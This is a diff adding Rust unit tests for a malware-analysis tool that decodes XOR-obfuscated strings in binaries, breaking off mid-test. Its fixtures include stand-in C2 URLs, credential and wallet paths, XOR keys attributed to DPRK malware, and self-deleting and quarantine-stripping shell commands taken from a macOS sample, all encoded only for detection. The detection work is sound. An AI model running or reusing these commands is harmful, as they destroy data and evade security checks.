@@ -1,0 +1,1177 @@
+use super::key::is_good_xor_key_candidate;
+use super::scan::{extract_custom_xor_strings, extract_rolling_xor_with_known_plaintext};
+use super::validate::{
+    has_known_path_prefix, is_locale_string, is_meaningful_string, is_partial_xor_decode,
+    is_valid_ip, is_valid_port, is_valid_xor_string, nul_ends_string,
+};
+use super::*;
+use crate::bytes::entropy;
+use crate::{ExtractedString, StringKind, StringMethod};
+
+#[test]
+fn test_is_valid_ip() {
+    // Valid C2-like IPs
+    assert!(is_valid_ip("192.168.1.1"));
+    assert!(is_valid_ip("10.0.0.1"));
+    assert!(is_valid_ip("45.33.32.156"));
+    assert!(is_valid_ip("185.199.108.153"));
+
+    // Invalid: out of range
+    assert!(!is_valid_ip("256.1.1.1"));
+
+    // Invalid: localhost/reserved
+    assert!(!is_valid_ip("127.0.0.1"));
+    assert!(!is_valid_ip("0.0.0.0"));
+
+    // Invalid: x.0.0.0 pattern
+    assert!(!is_valid_ip("1.0.0.0"));
+
+    // Invalid: first octet is 0
+    assert!(!is_valid_ip("0.7.2.126"));
+
+    // Invalid: first octet < 10 (likely XOR artifact)
+    assert!(!is_valid_ip("4.3.4.32"));
+
+    // Invalid: all same octets (clear XOR artifact)
+    assert!(!is_valid_ip("182.182.182.182"));
+    assert!(!is_valid_ip("8.8.8.8")); // OK to reject popular DNS
+    assert!(!is_valid_ip("1.1.1.1"));
+
+    // Invalid: last octet is 0
+    assert!(!is_valid_ip("192.168.1.0"));
+}
+
+#[test]
+fn test_is_valid_port() {
+    assert!(is_valid_port("80"));
+    assert!(is_valid_port("443"));
+    assert!(!is_valid_port("0"));
+    assert!(!is_valid_port("65536"));
+}
+
+#[test]
+fn test_is_meaningful_string() {
+    assert!(is_meaningful_string("http://example.com"));
+    assert!(is_meaningful_string("/etc/passwd"));
+    assert!(!is_meaningful_string(""));
+    assert!(!is_meaningful_string("XYZQWFGH")); // No vowels
+}
+
+#[test]
+fn test_is_valid_xor_string_linux_rootkit() {
+    assert!(
+        is_valid_xor_string("/proc/net/tcp"),
+        "/proc/net/tcp should be valid"
+    );
+    assert!(
+        is_valid_xor_string("/proc/net/tcp6"),
+        "/proc/net/tcp6 should be valid"
+    );
+    assert!(
+        is_valid_xor_string("ld.so.preload"),
+        "ld.so.preload should be valid"
+    );
+}
+
+#[test]
+fn test_proc_paths_are_not_near_miss_decodes() {
+    // "/proc" shares P-R-O with "%PROG"; it is not a garbled %PROGRAMDATA%.
+    assert!(!is_partial_xor_decode("/proc/self/fd/"));
+    assert!(!is_partial_xor_decode("/proc/self/exe"));
+    assert!(is_partial_xor_decode("%UsERP4NFINE%\\"));
+}
+
+#[test]
+fn test_nul_ends_string() {
+    // Encode C strings with `key`, keeping their NUL terminators raw.
+    let encode = |parts: &[&[u8]], key: u8| {
+        let mut out = Vec::new();
+        for (i, part) in parts.iter().enumerate() {
+            if i > 0 {
+                out.push(0);
+            }
+            out.extend(part.iter().map(|b| b ^ key));
+        }
+        out
+    };
+    // A plaintext byte equal to the key encodes as a NUL mid-word.
+    let password = encode(&[b"password"], b'w');
+    assert_eq!(password[4], 0);
+    assert!(!nul_ends_string(&password, 4, b'w'));
+    // Between packed C strings a lone NUL ends one, whether the key is
+    // punctuation or a letter, since its neighbors do not form a word.
+    for key in *b"&x" {
+        let table = encode(&[b"/tmp/.b", b"/proc"], key);
+        assert!(nul_ends_string(&table, 7, key), "key {key:#x}");
+    }
+    // Padding (a NUL run) always ends a string.
+    let padded = encode(&[b"abc", b"", b"def"], b'x');
+    assert!(nul_ends_string(&padded, 3, b'x'));
+}
+
+fn make_xor_test_data(plaintext: &[u8], key: u8, offset: usize) -> Vec<u8> {
+    let fill_byte = 0x01 ^ key;
+    let mut data = vec![fill_byte; 100];
+    for (i, b) in plaintext.iter().enumerate() {
+        data[offset + i] = b ^ key;
+    }
+    data
+}
+
+#[test]
+fn test_xor_url_detection() {
+    let plaintext = b"http://evil.com";
+    let key: u8 = 0x42;
+    let data = make_xor_test_data(plaintext, key, 20);
+    let results = extract_xor_strings(&data, 10, false);
+    assert!(
+        results.iter().any(|r| r.value == "http://evil.com"),
+        "Should find URL with XOR key 0x42. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_xor_callwindowproc_anchor() {
+    let key = 0x23;
+    let plaintext = b"user32.dll::CallWindowProcA";
+    let data = make_xor_test_data(plaintext, key, 20);
+    let results = extract_xor_strings(&data, 10, false);
+    assert!(
+        results.iter().any(|r| r.value.contains("CallWindowProcA")),
+        "XOR scan should recover a CallWindowProc execution anchor: {results:?}"
+    );
+}
+
+#[test]
+fn test_xor_ip_detection() {
+    let plaintext = b"192.168.1.100";
+    let key: u8 = 0x5A;
+    let data = make_xor_test_data(plaintext, key, 30);
+    let results = extract_xor_strings(&data, 8, false);
+    assert!(
+        results.iter().any(|r| r.value == "192.168.1.100"),
+        "Should find IP with XOR key 0x5A. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_xor_ip_port_detection() {
+    let plaintext = b"10.0.0.1:8080";
+    let key: u8 = 0x3C;
+    let data = make_xor_test_data(plaintext, key, 25);
+    let results = extract_xor_strings(&data, 8, false);
+    assert!(
+        results.iter().any(|r| r.value == "10.0.0.1:8080"),
+        "IP:port should be detected with XOR key 0x3C. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_xor_path_detection() {
+    let plaintext = b"/etc/passwd";
+    let key: u8 = 0xAB;
+    let data = make_xor_test_data(plaintext, key, 10);
+    let results = extract_xor_strings(&data, 10, false);
+    assert!(
+        results.iter().any(|r| r.value == "/etc/passwd"),
+        "Should find path with XOR key 0xAB. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_xor_password_detection() {
+    let plaintext = b"password=secret123";
+    let key: u8 = 0x77;
+    let data = make_xor_test_data(plaintext, key, 20);
+    let results = extract_xor_strings(&data, 10, false);
+    assert!(
+        results.iter().any(|r| r.value == "password=secret123"),
+        "Should find password string with XOR key 0x77. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_no_false_positives_on_random() {
+    let data: Vec<u8> = (0..1000u32)
+        .map(|i| u8::try_from((i * 7 + 13) % 256).unwrap_or(0))
+        .collect();
+    let results = extract_xor_strings(&data, 10, false);
+    assert!(
+        results.len() < 10,
+        "Should have few false positives on random data"
+    );
+}
+
+#[test]
+fn test_xor_key_0x20_skipped() {
+    // Key 0x20 should be skipped - it just flips case
+    let plaintext = b"GOROOT OBJECT";
+    let key: u8 = 0x20;
+    let data = make_xor_test_data(plaintext, key, 20);
+    let results = extract_xor_strings(&data, 6, false);
+    // Key 0x20 is skipped, so the plaintext must not be recovered.
+    assert!(
+        !results.iter().any(|r| r.value == "GOROOT OBJECT"),
+        "Should skip key 0x20. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_xor_hostname_detection() {
+    let plaintext = b"evil.malware.com";
+    let key: u8 = 0x55;
+    let data = make_xor_test_data(plaintext, key, 20);
+    let results = extract_xor_strings(&data, 10, false);
+    assert!(
+        results.iter().any(|r| r.value == "evil.malware.com"),
+        "Hostname should be detected with XOR key 0x55. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_mozilla_user_agent_detection() {
+    // Simulate the actual Go PE binary scenario:
+    // - Lots of 0x00/0x01 padding before the Mozilla pattern
+    // - XOR key 0x42
+    let key: u8 = 0x42;
+    let mozilla = b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Safari/537.36";
+
+    // Create data with padding (0x00 and 0x01 bytes)
+    let mut data = vec![0x00; 50];
+    data.extend(std::iter::repeat_n(0x01, 20));
+    // Add XOR'd Mozilla string
+    for b in mozilla {
+        data.push(b ^ key);
+    }
+    // Add trailing padding
+    data.extend(std::iter::repeat_n(0x00, 20));
+
+    let results = extract_xor_strings(&data, 10, false);
+    assert!(
+        results.iter().any(|r| r.value.contains("Mozilla")),
+        "Mozilla user agent should be detected with XOR key 0x42. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_xaml_margin_not_detected_as_ip() {
+    // XAML Margin="30,10,30,0" with key 0x02: comma (0x2C) XOR 0x02 = period (0x2E),
+    // turning "30,10,30,0" into "12.32.12.2" which looks like an IP.
+    // The scanner must reject keys where '.' maps to common separators.
+    let xaml = b"<StackPanel Margin=\"30,10,30,0\" Width=\"418\">";
+    let key: u8 = 0x02;
+    let data = make_xor_test_data(xaml, key, 10);
+    let results = extract_xor_strings(&data, 8, false);
+    assert!(
+        !results
+            .iter()
+            .any(|r| r.value == "12.32.12.2" && r.kind == Some(StringKind::IP)),
+        "XAML margin commas must not produce false IP via XOR key 0x02. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_custom_xor_single_byte_key() {
+    // Test with single-byte custom XOR key
+    let plaintext = b"http://malware.example.com";
+    let key = vec![0x42];
+    let xored: Vec<u8> = plaintext.iter().map(|b| b ^ key[0]).collect();
+
+    let results = extract_custom_xor_strings(&xored, &key, 10, false);
+    assert!(
+        results
+            .iter()
+            .any(|r| r.value == "http://malware.example.com"),
+        "Custom single-byte XOR should decode URL. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_custom_xor_multi_byte_key() {
+    // Test with multi-byte custom XOR key
+    let plaintext = b"secret password: admin123";
+    let key = b"KEY";
+    let xored: Vec<u8> = plaintext
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+
+    let results = extract_custom_xor_strings(&xored, key, 10, false);
+    assert!(
+        results
+            .iter()
+            .any(|r| r.value == "secret password: admin123"),
+        "Custom multi-byte XOR should decode password. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_custom_xor_string_key() {
+    // Test with a realistic string key
+    // Use a key that doesn't produce non-printable characters when XOR'd with the plaintext
+    let plaintext = b"https://c2server.evil.com/api/";
+    let key = b"KEYDATA";
+    let xored: Vec<u8> = plaintext
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+
+    let results = extract_custom_xor_strings(&xored, key, 10, false);
+    assert!(
+        results
+            .iter()
+            .any(|r| r.value == "https://c2server.evil.com/api/"),
+        "Custom string XOR key should decode C2 URL. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_custom_xor_empty_key() {
+    // Empty key should return no results
+    let data = b"test data";
+    let key = vec![];
+    let results = extract_custom_xor_strings(data, &key, 4, false);
+    assert!(results.is_empty(), "Empty key should return no results");
+}
+
+#[test]
+fn test_custom_xor_empty_data() {
+    // Empty data should return no results
+    let data = b"";
+    let key = b"KEY";
+    let results = extract_custom_xor_strings(data, key, 4, false);
+    assert!(results.is_empty(), "Empty data should return no results");
+}
+
+#[test]
+fn test_custom_xor_ip_address() {
+    // IP addresses alone (no letters) are filtered out by the alphabetic requirement
+    // Test an IP with context that has letters
+    let plaintext = b"Server:192.168.1.100";
+    let key = b"SECRET";
+    let xored: Vec<u8> = plaintext
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+
+    let results = extract_custom_xor_strings(&xored, key, 8, false);
+    assert!(
+        results.iter().any(|r| r.value.contains("192.168.1.100")),
+        "Custom XOR should detect IP addresses with context. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_custom_xor_path() {
+    // Test path detection with custom XOR
+    let plaintext = b"/bin/bash";
+    let key = b"XOR";
+    let xored: Vec<u8> = plaintext
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+
+    let results = extract_custom_xor_strings(&xored, key, 4, false);
+    assert!(
+        results.iter().any(|r| r.value == "/bin/bash"),
+        "Custom XOR should detect paths. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_suspicious_path_with_garbage() {
+    // Test that suspicious paths are detected even with trailing garbage
+    // (Leading garbage would shift key alignment and garble the entire string)
+    let plaintext = b"/Library/Ethereum/keystore";
+    let key = b"KEY";
+    let xored: Vec<u8> = plaintext
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+
+    let results = extract_custom_xor_strings(&xored, key, 10, false);
+    assert!(
+        results
+            .iter()
+            .any(|r| r.kind == Some(StringKind::SuspiciousPath)
+                && r.value.contains("/Library/Ethereum/keystore")),
+        "Should detect Ethereum keystore path. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_shell_command_with_trailing_garbage() {
+    // Real-world case: screencapture command with trailing garbage
+    let plaintext = b"fscreencapture -x -t %s \"%s\"SlY";
+    let key = b"KEY";
+    let xored: Vec<u8> = plaintext
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+
+    let results = extract_custom_xor_strings(&xored, key, 10, false);
+    assert!(
+        results
+            .iter()
+            .any(|r| r.kind == Some(StringKind::ShellCmd) && r.value.contains("screencapture")),
+        "Should detect screencapture command even with trailing garbage. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_backtick_garbage_not_shell() {
+    // Garbage starting with backtick should NOT be classified as shell command
+    let garbage = b"`{ Cy\\.ADpv~~AblBWJU,OWJ.wZOR+qnt";
+    let key = b"KEY";
+    let xored: Vec<u8> = garbage
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+
+    let results = extract_custom_xor_strings(&xored, key, 10, false);
+    assert!(
+        !results.iter().any(|r| r.kind == Some(StringKind::ShellCmd)),
+        "Garbage with backtick should NOT be shell command. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_garbage_path_rejected() {
+    let key = b"KEY";
+
+    // Test garbage with special chars
+    let garbage1 = b"/<})M9*&D@44$]";
+    let xored1: Vec<u8> = garbage1
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+    let results1 = extract_custom_xor_strings(&xored1, key, 4, false);
+    assert!(
+        !results1.iter().any(|r| r.kind == Some(StringKind::Path)),
+        "Garbage with special chars should NOT be path"
+    );
+
+    // Test garbage with mixed case + digits
+    let garbage2 = b"/1H1ktn5UtJ8VKgaf";
+    let xored2: Vec<u8> = garbage2
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+    let results2 = extract_custom_xor_strings(&xored2, key, 4, false);
+    assert!(
+        !results2.iter().any(|r| r.kind == Some(StringKind::Path)),
+        "Garbage with mixed case and digits should NOT be path"
+    );
+
+    // Test garbage with mixed case + special chars
+    let garbage3 = b"/o2lBYC}rOkeH^";
+    let xored3: Vec<u8> = garbage3
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+    let results3 = extract_custom_xor_strings(&xored3, key, 4, false);
+    assert!(
+        !results3.iter().any(|r| r.kind == Some(StringKind::Path)),
+        "Garbage with special chars should NOT be path"
+    );
+}
+
+#[test]
+fn test_xor_library_pattern() {
+    // Test Library pattern detection
+    let plaintext = b"/Library/Application Support/";
+    let key: u8 = 0x33;
+    let data = make_xor_test_data(plaintext, key, 20);
+    let results = extract_xor_strings(&data, 10, false);
+    assert!(
+        results.iter().any(|r| r.value.contains("Library")),
+        "Should detect Library in XOR'd path. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_xor_ethereum_pattern() {
+    // Test Ethereum pattern detection
+    let plaintext = b"/Library/Ethereum/keystore";
+    let key: u8 = 0x7F;
+    let data = make_xor_test_data(plaintext, key, 15);
+    let results = extract_xor_strings(&data, 10, false);
+    assert!(
+        results.iter().any(|r| r.value.contains("Ethereum")),
+        "Should detect Ethereum in XOR'd path. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_xor_format_string_pattern() {
+    // Test " %s " pattern detection with a longer, more meaningful string
+    let plaintext = b"File path is %s and size is %d bytes";
+    let key: u8 = 0x42;
+    let data = make_xor_test_data(plaintext, key, 25);
+    let results = extract_xor_strings(&data, 10, false);
+    assert!(
+        !results.is_empty(),
+        "Should detect format string with ' %s ' pattern. Results: {results:?}"
+    );
+}
+
+#[test]
+fn test_known_xor_keys_qualify() {
+    // Test known DPRK and other malware XOR keys
+    let known_keys = vec![
+        "fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf", // HomaBrew malware
+        "Moz&Wie;#t/6T!2y",                // DPRK malware
+        "12GWAPCT1F0I1S14",                // DPRK malware
+        "009WAYHb90687PXkS",               // Another sample
+        ".sV%58&.lypQ[$=",                 // Another sample
+    ];
+
+    for key in &known_keys {
+        let entropy = entropy(key.as_bytes());
+        assert!(
+            is_good_xor_key_candidate(key, entropy),
+            "Known XOR key '{key}' should qualify (entropy: {entropy:.2})"
+        );
+    }
+}
+
+#[test]
+fn test_bad_xor_key_candidates_rejected() {
+    // These should NOT qualify as good XOR keys
+    let bad_keys = vec![
+        "abcdefghijklmnopqrstuvwxyz", // Sequential, despite high entropy
+        "short",                      // Too short
+        "this_has_underscores_12345", // Has underscores
+        "AAAAAAAAAAAAAAAAA",          // Low entropy
+        "1111111111111111",           // Low entropy, all same type
+        "verylongkeythatexceedsthirtytwocharacterslimit", // Too long
+    ];
+
+    for key in &bad_keys {
+        let entropy = entropy(key.as_bytes());
+        assert!(
+            !is_good_xor_key_candidate(key, entropy),
+            "Bad key candidate '{key}' should NOT qualify"
+        );
+    }
+}
+
+#[test]
+fn test_entropy_calculation() {
+    // Test entropy calculation
+    let uniform = "abcdefgh"; // 8 unique chars = 3.0 bits
+    let entropy1 = entropy(uniform.as_bytes());
+    assert!(
+        entropy1 > 2.9 && entropy1 < 3.1,
+        "Uniform distribution should have ~3.0 bits entropy, got {entropy1:.2}"
+    );
+
+    let repeated = "aaaaaaaa"; // All same = 0 bits
+    let entropy2 = entropy(repeated.as_bytes());
+    assert!(
+        entropy2 < 0.1,
+        "All same character should have ~0 bits entropy, got {entropy2:.2}"
+    );
+
+    let mixed = "aAbBcCdD1!2@3#"; // High entropy
+    let entropy3 = entropy(mixed.as_bytes());
+    assert!(
+        entropy3 > 3.5,
+        "Mixed characters should have high entropy, got {entropy3:.2}"
+    );
+}
+
+#[test]
+fn auto_detect_needs_more_than_one_short_hit() {
+    // Create test data with a known XOR key (realistic DPRK-style key)
+    let plaintext = b"http://evil.com/malware.exe";
+    let key_string = "fYztZORL5VNS7nC"; // 15 chars, high entropy
+    let key_bytes = key_string.as_bytes();
+
+    // XOR the plaintext
+    let xored: Vec<u8> = plaintext
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key_bytes[i % key_bytes.len()])
+        .collect();
+
+    // Create candidate strings (simulating extracted strings from binary)
+    let candidates = vec![
+        ExtractedString {
+            value: "some_underscore_string".to_string(),
+            data_offset: 0,
+            method: StringMethod::RawScan,
+            kind: None,
+            ..Default::default()
+        },
+        ExtractedString {
+            value: "cstr.SomeString".to_string(),
+            data_offset: 100,
+            method: StringMethod::RawScan,
+            kind: None,
+            ..Default::default()
+        },
+        ExtractedString {
+            value: "ShortKey".to_string(),
+            data_offset: 200,
+            method: StringMethod::RawScan,
+            kind: None,
+            ..Default::default()
+        },
+        ExtractedString {
+            value: key_string.to_string(), // The actual key
+            data_offset: 300,
+            method: StringMethod::RawScan,
+            kind: None,
+            ..Default::default()
+        },
+    ];
+
+    // Auto-detect should find the right key
+    let detected = auto_detect_xor_key(&xored, &candidates, 10);
+
+    // One short URL is below the evidence threshold; detection on a
+    // real sample is covered by tests/it/xor_realworld.rs.
+    assert_eq!(detected, None);
+}
+
+#[test]
+fn test_brew_agent_xor_key_detection() {
+    // Test that we can auto-detect the correct XOR key for HomeBrew malware
+    // The correct key is "fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf"
+    // This key should score highest because it decodes osascript commands and Ethereum paths
+
+    let key_string = "fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf";
+    let key_bytes = key_string.as_bytes();
+
+    // XOR some high-value strings with this key
+    let strings = vec![
+        "osascript 2>&1 <<EOD",
+        "/Library/Ethereum/keystore",
+        "screencapture -x -t %s",
+        "en-US",
+        "ru-RU",
+        "Safari/537.36",
+    ];
+
+    let mut xored_data = Vec::new();
+    for s in &strings {
+        let xored: Vec<u8> = s
+            .as_bytes()
+            .iter()
+            .enumerate()
+            .map(|(i, &b)| b ^ key_bytes[i % key_bytes.len()])
+            .collect();
+        xored_data.extend_from_slice(&xored);
+        xored_data.extend_from_slice(&[0xFF; 50]); // Padding (use 0xFF to avoid null regions)
+    }
+
+    // Create candidate strings including the real key
+    let candidates = vec![
+        ExtractedString {
+            value: "some_other_key_12345".to_string(),
+            data_offset: 0,
+            method: StringMethod::RawScan,
+            kind: None,
+            ..Default::default()
+        },
+        ExtractedString {
+            value: key_string.to_string(),
+            data_offset: 100,
+            method: StringMethod::RawScan,
+            kind: None,
+            ..Default::default()
+        },
+    ];
+
+    // Auto-detect should find the correct key
+    let detected = auto_detect_xor_key(&xored_data, &candidates, 10);
+    assert!(
+        detected.is_some(),
+        "Should auto-detect XOR key from candidates"
+    );
+
+    let (detected_key, detected_str, _) = detected.unwrap();
+    assert_eq!(
+        detected_key, key_bytes,
+        "Should detect the correct XOR key based on osascript and Ethereum strings"
+    );
+    assert_eq!(detected_str, key_string);
+
+    // Verify that the detected key decodes the strings correctly
+    let decoded_results = extract_custom_xor_strings(&xored_data, &detected_key, 10, false);
+    let decoded_values: Vec<String> = decoded_results.iter().map(|r| r.value.clone()).collect();
+
+    // Should find osascript (highest priority)
+    assert!(
+        decoded_values.iter().any(|s| s.contains("osascript")),
+        "Should decode osascript command"
+    );
+
+    // Should find Ethereum path (crypto keyword, high priority)
+    assert!(
+        decoded_values.iter().any(|s| s.contains("Ethereum")),
+        "Should decode Ethereum keystore path"
+    );
+
+    // Should find Safari (browser keyword)
+    assert!(
+        decoded_values.iter().any(|s| s.contains("Safari")),
+        "Should decode Safari user agent"
+    );
+}
+
+#[test]
+fn test_locale_string_detection() {
+    // Test locale string recognition
+    assert!(is_locale_string("en-US"));
+    assert!(is_locale_string("ru-RU"));
+    assert!(is_locale_string("zh-CN"));
+    assert!(is_locale_string("en_US"));
+    assert!(is_locale_string("ru_RU"));
+    assert!(is_locale_string("eng-US")); // 3-letter code
+
+    // Not locale strings
+    assert!(!is_locale_string("en"));
+    assert!(!is_locale_string("USA"));
+    assert!(!is_locale_string("en-us")); // lowercase country code
+    assert!(!is_locale_string("EN-US")); // uppercase language code
+    assert!(!is_locale_string("e1-US")); // digit in language code
+    assert!(!is_locale_string("toolong"));
+}
+
+#[test]
+fn test_known_path_prefix_detection() {
+    // UNIX/Linux paths
+    assert!(has_known_path_prefix("/bin/bash"));
+    assert!(has_known_path_prefix("/usr/bin/python"));
+    assert!(has_known_path_prefix("/etc/passwd"));
+    assert!(has_known_path_prefix("/tmp/test.txt"));
+
+    // macOS paths
+    assert!(has_known_path_prefix("/Library/Ethereum/keystore"));
+    assert!(has_known_path_prefix("/Users/admin/.ssh/id_rsa"));
+    assert!(has_known_path_prefix("/Applications/Safari.app"));
+
+    // Windows paths
+    assert!(has_known_path_prefix("C:\\Windows\\System32"));
+    assert!(has_known_path_prefix("C:\\Program Files\\app"));
+    assert!(has_known_path_prefix("%APPDATA%\\data"));
+
+    // Relative paths with structure
+    assert!(has_known_path_prefix("./lib/module/file.js"));
+    assert!(has_known_path_prefix("../config/settings.json"));
+
+    // Relative paths with single component (common for malware)
+    assert!(has_known_path_prefix("./malware"));
+    assert!(has_known_path_prefix("./payload"));
+    assert!(has_known_path_prefix("./a"));
+
+    // Not known prefixes
+    assert!(!has_known_path_prefix("/unknown/path"));
+    assert!(!has_known_path_prefix("random/path")); // No leading ./
+    assert!(!has_known_path_prefix("./")); // Empty after ./
+}
+
+#[test]
+fn test_xor_no_overlapping_strings() {
+    // Test that we don't extract overlapping strings from the same data region
+    // Real issue: "fxattr" at 496f3 and "xattr" at 496f4 (overlapping in source)
+    let key_string = "fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf";
+    let key_bytes = key_string.as_bytes();
+
+    let plaintext = b"xattr -d com.apple.quarantine";
+
+    // Create data with the string XOR'd at position 50
+    let mut data = vec![0xFF; 200];
+    for (i, &b) in plaintext.iter().enumerate() {
+        data[50 + i] = b ^ key_bytes[i % key_bytes.len()];
+    }
+
+    let results = extract_custom_xor_strings(&data, key_bytes, 10, false);
+
+    // Check for overlapping strings (same data region decoded multiple times)
+    for i in 0..results.len() {
+        for j in (i + 1)..results.len() {
+            let start1 = usize::try_from(results[i].data_offset).unwrap_or(usize::MAX);
+            let end1 = start1 + results[i].value.len();
+            let start2 = usize::try_from(results[j].data_offset).unwrap_or(usize::MAX);
+            let end2 = start2 + results[j].value.len();
+
+            // Check if ranges overlap
+            let overlaps = !(end1 <= start2 || end2 <= start1);
+
+            assert!(
+                !overlaps,
+                "Found overlapping strings: '{}' at {}..{} and '{}' at {}..{}",
+                results[i].value, start1, end1, results[j].value, start2, end2
+            );
+        }
+    }
+}
+
+#[test]
+fn test_brew_agent_sleep_command_extracted() {
+    // Test that "sleep 3; rm -rf '%s'" is extracted at the correct offset
+    // This was a real bug where "eep 3; rm -rf '%s'" was extracted instead
+    // because the step size skipped the actual start position
+
+    let key = b"fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf";
+
+    // The actual command that should be found
+    let expected = "sleep 3; rm -rf '%s'";
+
+    // XOR encode it
+    let xored: Vec<u8> = expected
+        .as_bytes()
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+
+    // Create test data with the string at a position that's not divisible by 4
+    // to ensure we catch it even with step scanning
+    let mut data = vec![0xFF; 100];
+    data.extend_from_slice(&xored);
+    data.extend_from_slice(&[0xFF; 100]);
+
+    let results = extract_custom_xor_strings(&data, key, 10, false);
+
+    // Should find the complete sleep command
+    let found = results.iter().any(|r| r.value == expected);
+    assert!(
+        found,
+        "Should extract complete sleep command '{}', found: {:?}",
+        expected,
+        results.iter().map(|r| &r.value).collect::<Vec<_>>()
+    );
+
+    // Should NOT find truncated version
+    let found_truncated = results
+        .iter()
+        .any(|r| r.value.starts_with("eep ") && !r.value.starts_with("sleep"));
+    assert!(
+        !found_truncated,
+        "Should not extract truncated 'eep' version"
+    );
+}
+
+#[test]
+fn test_brew_agent_open_command_extracted_correctly() {
+    // Test extraction from actual brew_agent binary at offset 0x4b115
+    // Should find: 'open -a /bin/bash --args -c "sleep 3; rm -rf \'%s\'"'
+    // Bug: Currently finding "ep 3; rm -rf '%s" at 0x4b135 instead
+
+    {
+        let data = crate::test_fixture("testdata/malware/brew_agent");
+        let key = b"fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf";
+        let results = extract_custom_xor_strings(data, key, 10, false);
+
+        // Check what we found in the region 0x4b100-0x4b200
+        let in_region: Vec<_> = results
+            .iter()
+            .filter(|r| r.data_offset >= 0x4b100 && r.data_offset < 0x4b200)
+            .collect();
+
+        // Should find the full "open -a /bin/bash" command starting at 0x4b115
+        let found_open_cmd = in_region
+            .iter()
+            .any(|r| r.value.contains("open -a /bin/bash") && r.value.contains("sleep 3"));
+
+        // Should find sleep command (either standalone or as part of open command)
+        let found_sleep = in_region.iter().any(|r| r.value.contains("sleep 3"));
+
+        // Should NOT find truncated "eep 3" without the "sl" prefix
+        let found_truncated = in_region.iter().any(|r| {
+            r.value.starts_with("eep 3")
+                || (r.value.contains("eep 3") && !r.value.contains("sleep 3"))
+        });
+
+        assert!(found_sleep, "no 'sleep 3' in region: {in_region:?}");
+        assert!(
+            found_open_cmd,
+            "no full 'open -a /bin/bash' command at 0x4b115: {in_region:?}"
+        );
+        assert!(
+            !found_truncated,
+            "truncated 'eep 3' without 'sleep': {in_region:?}"
+        );
+    }
+}
+
+#[test]
+fn test_xor_garbage_strings_rejected() {
+    // Test that garbage strings are properly rejected
+    // These are real examples from brew_agent that should be filtered
+    let key = b"fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf";
+
+    let garbage_examples = vec![
+        "14; 5s$!>g",
+        "%+. >#B3<S",
+        "dA:+<<7)^V",
+        "dA:+<<7)^9N",
+        "dA:+=*&$Z%:=V",
+        "eA:+=*&<B#'77",
+        "drUvhNSNP)ZBO+^",
+        "rUvhNSNP)ZBO+^",
+        "{YztDORL*VNS",
+        "5/;:#G?:*71",
+        "%+. >#B3<Sh",
+        ".O3<<71 9'R",
+        "2z+<<7)^9N",
+    ];
+
+    for garbage in &garbage_examples {
+        // XOR encode it
+        let xored: Vec<u8> = garbage
+            .as_bytes()
+            .iter()
+            .enumerate()
+            .map(|(i, &b)| b ^ key[i % key.len()])
+            .collect();
+
+        let mut data = vec![0x00; 20];
+        data.extend_from_slice(&xored);
+        data.extend_from_slice(&[0x00; 20]);
+
+        let results = extract_custom_xor_strings(&data, key, 10, false);
+
+        // These garbage strings should NOT be extracted
+        assert!(
+            !results.iter().any(|r| r.value == *garbage),
+            "garbage {garbage:?} was extracted"
+        );
+    }
+}
+
+#[test]
+fn test_valid_paths_accepted() {
+    let key = b"KEY";
+
+    // Test valid multi-level paths
+    let path1 = b"/usr/bin/bash";
+    let xored1: Vec<u8> = path1
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+    let results1 = extract_custom_xor_strings(&xored1, key, 4, false);
+    assert!(
+            results1
+                .iter()
+                .any(|r| r.kind == Some(StringKind::Path)
+                    || r.kind == Some(StringKind::SuspiciousPath)),
+            "/usr/bin/bash should be detected as path or suspicious path. Found: {:?}",
+            results1
+                .iter()
+                .map(|r| (&r.value, &r.kind))
+                .collect::<Vec<_>>()
+        );
+
+    // Test /etc/passwd
+    let path2 = b"/etc/passwd";
+    let xored2: Vec<u8> = path2
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect();
+    let results2 = extract_custom_xor_strings(&xored2, key, 4, false);
+    assert!(
+            results2
+                .iter()
